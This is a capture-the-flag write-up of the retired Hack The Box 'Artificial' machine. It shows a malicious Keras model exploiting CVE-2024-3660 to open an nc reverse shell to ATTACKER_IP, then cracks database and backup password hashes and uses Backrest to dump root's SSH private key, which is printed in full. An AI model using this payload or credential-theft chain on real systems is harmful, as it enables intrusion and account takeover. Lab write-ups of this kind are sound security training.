---
title: "🤖 HTB Artificial Write-up"
name: Artificial
date: 2025-10-26
last_modified_at: 2025-11-01
difficulty: Easy
os: Linux
skills: "Enumeration, Reverse Shell, Database Looting, Password Cracking, Credential Hunting, SSH Local Port Forwarding, Privilege Escalation"
tools: "rustscan, nmap, CVE-2024-3660, revshells, nc, sqlite3, hashcat, ssh" 
published: true
---

![](images/Pasted%20image%2020250714193655.png)

## 📝 Summary

The `artificial.htb` web application was vulnerable to **CVE-2024-3660** in TensorFlow Keras. By uploading a crafted AI model, I triggered the flaw and achieved remote code execution, landing a reverse shell as the `app` user.

An SQLite backend contained an MD5 password hash for user **Gael**. I cracked the hash with Hashcat, used the credentials to SSH in as Gael, and discovered that Gael belonged to the `sysadm` group. That membership permitted reading a backup file which held a bcrypt hash for the **backrest** root user — another Hashcat crack gave me those credentials.

Because the BackRest web interface was bound to localhost, I used SSH local port forwarding to expose it to my attack host and authenticated as the BackRest root user. From there, I created a backup job that included `/root/.ssh`, extracted the root `id_rsa` private key from the archive, and used it to obtain an interactive SSH session as **root**.

## 🧠 TensorFlow Keras RCE
### 🔎 Recon

**Initial scan** revealed only two ports open:
- `22/tcp`: OpenSSH 8.2p1
- `80/tcp`: nginx 1.18.0

```
fcoomans@kali:~/htb/artificial$ rustscan -a 10.10.11.74 --tries 5 --ulimit 10000 -- -sCV -oA artificial_tcp_all
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
RustScan: Making sure 'closed' isn't just a state of mind.

[~] The config file is expected to be at "/home/fcoomans/.rustscan.toml"
[~] Automatically increasing ulimit value to 10000.
Open 10.10.11.74:22
Open 10.10.11.74:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} -{{ipversion}} {{ip}} -sCV -oA artificial_tcp_all" on ip 10.10.11.74
Depending on the complexity of the script, results may take some time to appear.

<SNIP>

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 7c:e4:8d:84:c5:de:91:3a:5a:2b:9d:34:ed:d6:99:17 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDNABz8gRtjOqG4+jUCJb2NFlaw1auQlaXe1/+I+BhqrriREBnu476PNw6mFG9ifT57WWE/qvAZQFYRvPupReMJD4C3bE3fSLbXAoP03+7JrZkNmPRpVetRjUwP1acu7golA8MnPGzGa2UW38oK/TnkJDlZgRpQq/7DswCr38IPxvHNO/15iizgOETTTEU8pMtUm/ISNQfPcGLGc0x5hWxCPbu75OOOsPt2vA2qD4/sb9bDCOR57bAt4i+WEqp7Ri/act+f4k6vypm1sebNXeYaKapw+W83en2LnJOU0lsdhJiAPKaD/srZRZKOR0bsPcKOqLWQR/A6Yy3iRE8fcKXzfbhYbLUiXZzuUJoEMW33l8uHuAza57PdiMFnKqLQ6LBfwYs64Q3v8oAn5O7upCI/nDQ6raclTSigAKpPbliaL0HE/P7UhNacrGE7Gsk/FwADiXgEAseTn609wBnLzXyhLzLb4UVu9yFRWITkYQ6vq4ZqsiEnAsur/jt8WZY6MQ8=
|   256 83:46:2d:cf:73:6d:28:6f:11:d5:1d:b4:88:20:d6:7c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOdlb8oU9PsHX8FEPY7DijTkQzsjeFKFf/xgsEav4qedwBUFzOetbfQNn3ZrQ9PMIHrguBG+cXlA2gtzK4NPohU=
|   256 e3:18:2e:3b:40:61:b4:59:87:e8:4a:29:24:0f:6a:fc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH8QL1LMgQkZcpxuylBjhjosiCxcStKt8xOBU0TjCNmD
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://artificial.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

<SNIP>
```

After pointing `artificial.htb` in `/etc/hosts`,

```
fcoomans@kali:~/htb/artificial$ grep artificial /etc/hosts
10.10.11.74     artificial.htb
```

I opened the website and found a site that allows me to build, test and deploy AI models.

![](images/Pasted%20image%2020250714180943.png)

I registered a user account and logged in.  The Dashboard allowed me to upload an AI model.  It recommended using a `Dockerfile` to build the model and then upload it as an `h5` TensorFlow model.

![](images/Pasted%20image%2020250714180724.png)

Searching for exploits revealed a TensorFlow Keras Downgrade Attack, which allowed remote code execution.  This vulnerability was assigned CVE-2024-3660.

See these two articles for more info:
https://www.oligo.security/blog/tensorflow-keras-downgrade-attack-cve-2024-3660-bypass
https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model

### 🧪 Exploitation

#### 🐞 CVE-2024-3660

I downloaded the `Dockerfile` from the site and built the Docker image.

```
fcoomans@ubuntu:~/docker$ cd tensorflow/
fcoomans@ubuntu:~/docker/tensorflow$ ls
Dockerfile  exploit.py
fcoomans@ubuntu:~/docker/tensorflow$ cat Dockerfile
FROM python:3.8-slim

WORKDIR /code

RUN apt-get update && \
    apt-get install -y curl && \
    curl -k -LO https://files.pythonhosted.org/packages/65/ad/4e090ca3b4de53404df9d1247c8a371346737862cfe539e7516fd23149a4/tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl && \
    rm -rf /var/lib/apt/lists/*

RUN pip install ./tensorflow_cpu-2.13.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl

ENTRYPOINT ["/bin/bash"]
fcoomans@ubuntu:~/docker/tensorflow$ docker build -t tf .
[+] Building 44.4s (5/7)   
<SNIP>
```

I then run the image as an interactive container and mount the local folder containing the `exploit.py` that contains the RCE code under the `/code` directory in the container.

```
fcoomans@ubuntu:~/docker/tensorflow$ docker run -v .:/code -it tf
root@0f60956dc120:/code# ls
Dockerfile  exploit.py
```

I use https://www.revshells.com to generate a `nc mkfifo` reverse shell.

![](images/Pasted%20image%2020251025130430.png)

And added this to the `exploit.py` file.

```python
root@881bc15a3191:/code# cat exploit.py
import tensorflow as tf

def exploit(x):
    import os
    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

`exploit.py` was then executed in the container to build the AI model.

```
root@881bc15a3191:/code# python exploit.py
2025-07-14 15:51:19.928220: I tensorflow/core/platform/cpu_feature_guard.cc:182] This TensorFlow binary is optimized to use available CPU instructions in performance-critical operations.
To enable the following instructions: AVX2 FMA, in other operations, rebuild TensorFlow with the appropriate compiler flags.
sh: 1: nc: not found
/usr/local/lib/python3.8/site-packages/keras/src/engine/training.py:3000: UserWarning: You are saving your model as an HDF5 file via `model.save()`. This file format is considered legacy. We recommend using instead the native Keras format, e.g. `model.save('my_model.keras')`.
  saving_api.save_model(
<SNIP>
```

The malicious AI model was saved under `exploit.h5`.

```
root@881bc15a3191:/code# ls -lh exploit.h5
-rw-r--r-- 1 root root 9.8K Jul 14 15:51 exploit.h5
```

A `nc` listener was started on the attack host.

```
fcoomans@kali:~/htb/artificial$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
```

And the malicious AI model was uploaded to the target.

![](images/Pasted%20image%2020250714180334.png)

The `View Predictions` button was clicked,

![](images/Pasted%20image%2020250714180413.png)

#### 👣 Foothold as app

And the `nc` listener caught a reverse shell from user `app` on the target.

```
fcoomans@kali:~/htb/artificial$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [ATTACKER_IP] from (UNKNOWN) [10.10.11.74] 51096
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(app) gid=1001(app) groups=1001(app)
```

I used Python to make the shell interactive.  Only users `root`, `gael` and `app` had interactive shells.

```
$ python3 -c "import pty; pty.spawn('/bin/bash')"
app@artificial:~$ ls -lh
ls -lh
total 4.0K
drwxrwxr-x 7 app app 4.0K Jun  9 13:56 app
app@artificial:~$ grep sh /etc/passwd
grep sh /etc/passwd
root:x:0:0:root:/root:/bin/bash
fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
gael:x:1000:1000:gael:/home/gael:/bin/bash
app:x:1001:1001:,,,:/home/app:/bin/bash
```

Looking at the Flask Python app running the website shows that the SQLite database `users.db` was used.

```python
app@artificial:~/app$ cat app.py
cat app.py
from flask import Flask, render_template, request, redirect, url_for, session, send_file, flash
from flask_sqlalchemy import SQLAlchemy
from werkzeug.utils import secure_filename
import os
import tensorflow as tf
import hashlib
import uuid
import numpy as np
import io
from contextlib import redirect_stdout
import hashlib

app = Flask(__name__)
app.secret_key = "Sup3rS3cr3tKey4rtIfici4L"

app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['UPLOAD_FOLDER'] = 'models'

<SNIP>
```

The database was found under `instance/users.db`.

```
app@artificial:~/app$ find ~ -name users.db
find ~ -name users.db
/home/app/app/instance/users.db
```

`sqlite3` was used to open and query the database.  The `user` table contains a MD5 hash for user `gael`.

```
app@artificial:~/app$ sqlite3 instance/users.db
sqlite3 instance/users.db
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables
.tables
model  user
sqlite> .schema user
.schema user
CREATE TABLE user (
        id INTEGER NOT NULL,
        username VARCHAR(100) NOT NULL,
        email VARCHAR(120) NOT NULL,
        password VARCHAR(200) NOT NULL,
        PRIMARY KEY (id),
        UNIQUE (username),
        UNIQUE (email)
);
sqlite> select * from user;
select * from user;
1|gael|gael@artificial.htb|c99175974b6e192936d97224638a34f8
2|mark|mark@artificial.htb|0f3d8c76530022670f1c6029eed09ccb
3|robert|robert@artificial.htb|b606c5f5136170f15444251665638b36
4|royer|royer@artificial.htb|bc25b1f80f544c0ab451c02a3dca9fc6
5|mary|mary@artificial.htb|bf041041e57f1aff3be7ea1abd6129d0
<SNIP>
sqlite> .exit
.exit
```

#### 🔼 PrivEsc to Gael

`hashcat` was used to crack the MD5 hash.  Gael's password was `mattp005numbertwo`.

```
fcoomans@kali:~/htb/artificial$ hashcat -m 0 c99175974b6e192936d97224638a34f8 /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

c99175974b6e192936d97224638a34f8:mattp005numbertwo

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: c99175974b6e192936d97224638a34f8

<SNIP>
```

I successfully SSH to the target as user Gael and this password.

```
fcoomans@kali:~/htb/artificial$ ssh gael@artificial.htb
The authenticity of host 'artificial.htb (10.10.11.74)' can't be established.
ED25519 key fingerprint is SHA256:RfqGfdDw0WXbAPIqwri7LU4OspmhEFYPijXhBj6ceHs.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'artificial.htb' (ED25519) to the list of known hosts.
gael@artificial.htb's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon 14 Jul 2025 04:01:43 PM UTC

  System load:  0.0               Processes:             254
  Usage of /:   65.4% of 7.53GB   Users logged in:       1
  Memory usage: 37%               IPv4 address for eth0: 10.10.11.74
  Swap usage:   0%


Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Jul 14 16:01:44 2025 from ATTACKER_IP
gael@artificial:~$ id
uid=1000(gael) gid=1000(gael) groups=1000(gael),1007(sysadm)
```

### 💰 Post Exploitation
#### 🚩 user.txt

Gael was the holder of the `user.txt` flag.

```
gael@artificial:~$ cat user.txt
64f6ab2df6debf3c606d305dc476c181
```

## 🪑 backrest
### 🔎 Recon

LinPEAS found some services running on localhost on ports 5000 and 9898. 

```
╔══════════╣ Active Ports
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#open-ports
══╣ Active Ports (netstat)
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:9898          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp6       0      0 :::80                   :::*                    LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
```

As well as a backup file which could be read by the `sysadm` group.  Luckily, Gael was a member of that group.

```
╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root gael 33 Jul 14 13:57 /home/gael/user.txt
-rw-r----- 1 root sysadm 52357120 Mar  4 22:19 /var/backups/backrest_backup.tar.gz
```

### 🧪 Exploitation

I used `tar` to look at the contents of the backup file and found a `config.json` file in the backup.

```
gael@artificial:~$ tar tvf /var/backups/backrest_backup.tar.gz
drwxr-xr-x root/root         0 2025-03-04 22:17 backrest/
-rwxr-xr-x root/root  26501272 2025-03-03 04:28 backrest/restic
-rw-r--r-- root/root         0 2025-03-04 22:17 backrest/oplog.sqlite-wal
-rw-r--r-- root/root     32768 2025-03-04 22:17 backrest/oplog.sqlite-shm
drwxr-xr-x root/root         0 2025-03-03 21:27 backrest/.config/
drwxr-xr-x root/root         0 2025-03-04 22:17 backrest/.config/backrest/
-rw------- root/root       280 2025-03-04 22:17 backrest/.config/backrest/config.json
-rw------- root/root         0 2025-03-03 21:18 backrest/oplog.sqlite.lock
-rwxr-xr-x app/ssl-cert 25690264 2025-02-16 19:38 backrest/backrest
drwxr-xr-x root/root           0 2025-03-04 22:17 backrest/tasklogs/
-rw-r--r-- root/root       32768 2025-03-04 22:17 backrest/tasklogs/logs.sqlite-shm
drwxr-xr-x root/root           0 2025-03-03 21:18 backrest/tasklogs/.inprogress/
-rw-r--r-- root/root           0 2025-03-04 22:17 backrest/tasklogs/logs.sqlite-wal
-rw-r--r-- root/root       24576 2025-03-04 22:13 backrest/tasklogs/logs.sqlite
-rw-r--r-- root/root       57344 2025-03-04 22:13 backrest/oplog.sqlite
-rw------- root/root          64 2025-03-03 21:18 backrest/jwt-secret
drwxr-xr-x root/root           0 2025-03-03 21:18 backrest/processlogs/
-rw------- root/root        2122 2025-03-04 22:17 backrest/processlogs/backrest.log
-rwxr-xr-x app/ssl-cert     3025 2025-03-03 04:28 backrest/install.sh
```

I then used `tar` to print the file contents to the terminal and found a bcrypt password hash for user `backrest_root`.

```
gael@artificial:~$ tar Oxf /var/backups/backrest_backup.tar.gz backrest/.config/backrest/config.json
{
  "modno": 2,
  "version": 4,
  "instance": "Artificial",
  "auth": {
    "disabled": false,
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}
```

The hash was `base64` encoded.

```
fcoomans@kali:~/htb/artificial$ echo -n JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP |base64 -d
$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO
```

The older version of `hashcat` showed that mode `3200` had to be used to crack the hash.

```
fcoomans@kali:~/htb/artificial/loot$ hashcat --help |grep -i bcrypt
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce
```

The newer version of `hashcat` showed the same.

```
fcoomans@kali:~/htb/artificial$ hashcat --identify '$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO'
The following 6 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
  25600 | bcrypt(md5($pass))                                         | Generic KDF
  25800 | bcrypt(sha1($pass))                                        | Generic KDF
  30600 | bcrypt(sha256($pass))                                      | Generic KDF
  28400 | bcrypt(sha512($pass))                                      | Generic KDF
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  33800 | WBB4 (Woltlab Burning Board) [bcrypt(bcrypt($pass))]       | Forums, CMS, E-Commerce
```

`hashcat` was used to crack the bcrypt password hash using the `rockyou.txt` wordlist.  The password was `!@#$%^`.

```
fcoomans@kali:~/htb/artificial$ hashcat -m 3200 '$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO' /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP58EBZz/0QO:!@#$%^

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR/ACMMkSsspbRutYP5...Zz/0QO

<SNIP>
```

SSH was then used to create a local port forward to the service running on localhost on port `9898` on the target.

```
fcoomans@kali:~/htb/artificial$ ssh -L 127.0.0.1:9898:127.0.0.1:9898 gael@artificial.htb
gael@artificial.htb's password:
```

I opened the site on the attack host and used the username `backrest_root` and password `!@#$%^` to log into the backrest app.

![](images/Pasted%20image%2020250714184502.png)

This appeared to be a program to back up and restore files.

![](images/Pasted%20image%2020250714184925.png)

I created a new repo under `/tmp/`.

![](images/Pasted%20image%2020250714185252.png)

And created a backup plan to back up `/root/.ssh`.  I also disabled the schedule as I wanted to run the backup immediately.

![](images/Pasted%20image%2020250714185531.png)

The `root` plan was selected, and the `Backup Now` button was clicked.

![](images/Pasted%20image%2020250714185608.png)

The backup was taken, and the `List View` tab showed that the `/root/.ssh/id_rsa` file was backed up.  But how do I access this file?

![](images/Pasted%20image%2020250714193016.png)

I clicked on `Run Command`.

![](images/Pasted%20image%2020251025135956.png)

And from the `help` found that the `dump` command can be used to dump the file to stdout.

![](images/Pasted%20image%2020251025140225.png)

`dump --help` displayed the command format: `restic dump [flags] snapshotID file`

![](images/Pasted%20image%2020251025140436.png)

I had the snapshot ID from the backup `List View` and ran the command `dump e77fb02f /root/.ssh/id_rsa`, and the file content was printed to stdout.

![](images/Pasted%20image%2020250714192745.png)

I created a file `id_rsa` and copied the SSH Private Key to the file, and changed the permissions.

```
fcoomans@kali:~/htb/artificial$ chmod 600 id_rsa

fcoomans@kali:~/htb/artificial$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEA5dXD22h0xZcysyHyRfknbJXk5O9tVagc1wiwaxGDi+eHE8vb5/Yq
2X2jxWO63SWVGEVSRH61/1cDzvRE2br3GC1ejDYfL7XEbs3vXmb5YkyrVwYt/G/5fyFLui
NErs1kAHWBeMBZKRaSy8VQDRB0bgXCKqqs/yeM5pOsm8RpT/jjYkNdZLNVhnP3jXW+k0D1
Hkmo6C5MLbK6X5t6r/2gfUyNAkjCUJm6eJCQgQoHHSVFqlEFWRTEmQAYjW52HzucnXWJqI
4qt2sY9jgGo89Er72BXEfCzAaglwt/W1QXPUV6ZRfgqSi1LmCgpVQkI9wcmSWsH1RhzQj/
MTCSGARSFHi/hr3+M53bsmJ3zkJx0443yJV7P9xjH4I2kNWgScS0RiaArkldOMSrIFymhN
xI4C2LRxBTv3x1mzgm0RVpXf8dFyMfENqlAOEkKJjVn8QFg/iyyw3XfOSJ/Da1HFLJwDOy
1jbuVzGf9DnzkYSgoQLDajAGyC8Ymx6HVVA49THRAAAFiIVAe5KFQHuSAAAAB3NzaC1yc2
EAAAGBAOXVw9todMWXMrMh8kX5J2yV5OTvbVWoHNcIsGsRg4vnhxPL2+f2Ktl9o8Vjut0l
lRhFUkR+tf9XA870RNm69xgtXow2Hy+1xG7N715m+WJMq1cGLfxv+X8hS7ojRK7NZAB1gX
jAWSkWksvFUA0QdG4FwiqqrP8njOaTrJvEaU/442JDXWSzVYZz9411vpNA9R5JqOguTC2y
ul+beq/9oH1MjQJIwlCZuniQkIEKBx0lRapRBVkUxJkAGI1udh87nJ11iaiOKrdrGPY4Bq
PPRK+9gVxHwswGoJcLf1tUFz1FemUX4KkotS5goKVUJCPcHJklrB9UYc0I/zEwkhgEUhR4
v4a9/jOd27Jid85CcdOON8iVez/cYx+CNpDVoEnEtEYmgK5JXTjEqyBcpoTcSOAti0cQU7
98dZs4JtEVaV3/HRcjHxDapQDhJCiY1Z/EBYP4sssN13zkifw2tRxSycAzstY27lcxn/Q5
85GEoKECw2owBsgvGJseh1VQOPUx0QAAAAMBAAEAAAGAKpBZEkQZBBLJP+V0gcLvqytjVY
aFwAw/Mw+X5Gw86Wb6XA8v7ZhoPRkIgGDE1XnFT9ZesvKob95EhUo1igEXC7IzRVIsmmBW
PZMD1n7JhoveW2J4l7yA/ytCY/luGdVNxMv+K0er+3EDxJsJBTJb7ZhBajdrjGFdtcH5gG
tyeW4FZkhFfoW7vAez+82neovYGUDY+A7C6t+jplsb8IXO+AV6Q8cHvXeK0hMrv8oEoUAq
06zniaTP9+nNojunwob+Uzz+Mvx/R1h6+F77DlhpGaRVAMS2eMBAmh116oX8MYtgZI5/gs
00l898E0SzO8tNErgp2DvzWJ4uE5BvunEKhoXTL6BOs0uNLZYjOmEpf1sbiEj+5fx/KXDu
S918igW2vtohiy4//6mtfZ3Yx5cbJALViCB+d6iG1zoe1kXLqdISR8Myu81IoPUnYhn6JF
yJDmfzfQRweboqV0dYibYXfSGeUdWqq1S3Ea6ws2SkmjYZPq4X9cIYj47OuyQ8LpRVAAAA
wDbejp5aOd699/Rjw4KvDOkoFcwZybnkBMggr5FbyKtZiGe7l9TdOvFU7LpIB5L1I+bZQR
6E0/5UW4UWPEu5Wlf3rbEbloqBuSBuVwlT3bnlfFu8rzPJKXSAHxUTGU1r+LJDEiyOeg8e
09RsVL31LGX714SIEfIk/faa+nwP/kTHOjKdH0HCWGdECfKBz0H8aLHrRK2ALVFr2QA/GO
At7A4TZ3W3RNhWhDowiyDQFv4aFGTC30Su7akTtKqQEz/aOQAAAMEA/EkpTykaiCy6CCjY
WjyLvi6/OFJoQz3giX8vqD940ZgC1B7GRFyEr3UDacijnyGegdq9n6t73U3x2s3AvPtJR+
LBeCNCKmOILeFbH19o2Eg0B32ZDwRyIx8tnxWIQfCyuUSG9gEJ6h2Awyhjb6P0UnnPuSoq
O9r6L+eFbQ60LJtsEMWkctDzNzrtNQHmRAwVEgUc0FlNNknM/+NDsLFiqG4wBiKDvgev0E
UzM9+Ujyio6EqW6D+TTwvyD2EgPVVDAAAAwQDpN/02+mnvwp1C78k/T/SHY8zlQZ6BeIyJ
h1U0fDs2Fy8izyCm4vCglRhVc4fDjUXhBEKAdzEj8dX5ltNndrHzB7q9xHhAx73c+xgS9n
FbhusxvMKNaQihxXqzXP4eQ+gkmpcK3Ta6jE+73DwMw6xWkRZWXKW+9tVB6UEt7n6yq84C
bo2vWr51jtZCC9MbtaGfo0SKrzF+bD+1L/2JcSjtsI59D1KNiKKTKTNRfPiwU5DXVb3AYU
l8bhOOImho4VsAAAAPcm9vdEBhcnRpZmljaWFsAQIDBA==
-----END OPENSSH PRIVATE KEY-----
```

The `id_rsa` file was then used to successfully SSH to the target as user `root`.

```
fcoomans@kali:~/htb/artificial$ ssh -i id_rsa root@artificial.htb
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-216-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon 14 Jul 2025 05:30:44 PM UTC

  System load:  0.81              Processes:             282
  Usage of /:   71.0% of 7.53GB   Users logged in:       1
  Memory usage: 38%               IPv4 address for eth0: 10.10.11.74
  Swap usage:   0%


Expanded Security Maintenance for Infrastructure is not enabled.

0 updates can be applied immediately.

Enable ESM Infra to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Jul 14 17:30:45 2025 from ATTACKER_IP
root@artificial:~# id
uid=0(root) gid=0(root) groups=0(root)
```

### 💰 Post Exploitation

#### 🏆 root.txt

`root` is the holder of the `root.txt` flag.

```
root@artificial:~# cat root.txt
e9b31a013b682f938fb16265fb8d8457
```

Guess that old AI had done enough heavy lifting — it sat in its BackRest to relax and accidentally handed me root.

And `Artificial has been Pwned!` 🎉

![](images/Pasted%20image%2020250714193517.png)

## 📚 Lessons Learned

- **Outdated TensorFlow/Keras:** Keep machine learning libraries patched and validate uploaded models to prevent known exploits.
- **Weak MD5 password hash:** Use strong password hashing (bcrypt/argon2) and enforce complex password policies.
- **Excessive privileges (Gael’s sysadm access):** Apply the Principle of Least Privilege and remove unnecessary group memberships.
- **Weak backrest root password:** Enforce strong, unique passwords for all service and administrative accounts.
- **Localhost-only exposure:** Don’t rely on localhost for security — use proper authentication and network restrictions.
- **Overprivileged backup process:** Run backups with limited permissions and exclude sensitive files like SSH keys.

## ⚠️ Disclaimer

This write-up covers a retired HTB machine and is for educational purposes only. All IPs, credentials, and flags exist in a lab environment. My username is intentionally used throughout this write-up to build my cybersecurity brand.

